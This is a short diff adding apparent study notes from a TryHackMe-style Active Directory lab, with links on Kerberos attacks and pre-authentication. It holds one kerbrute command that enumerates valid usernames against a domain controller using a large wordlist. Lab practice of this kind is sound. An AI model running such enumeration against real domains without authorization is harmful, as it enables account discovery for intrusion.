@@ -1,0 +1,6 @@
+```bash
+./kerbrute userenum -d THM-AD --dc 10.10.170.158 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
+```
+
+[owasp-dorset-pwning-kerberos](https://docs.google.com/presentation/d/1JQ7QTDIrfhw4Hr2zZjitQEntmEcEYcsDLiAF0MdXweI/edit#slide=id.g137c1641404_0_44)
+[Kerberos Pre-Authentication: Why It Should Not Be Disabled](https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx)
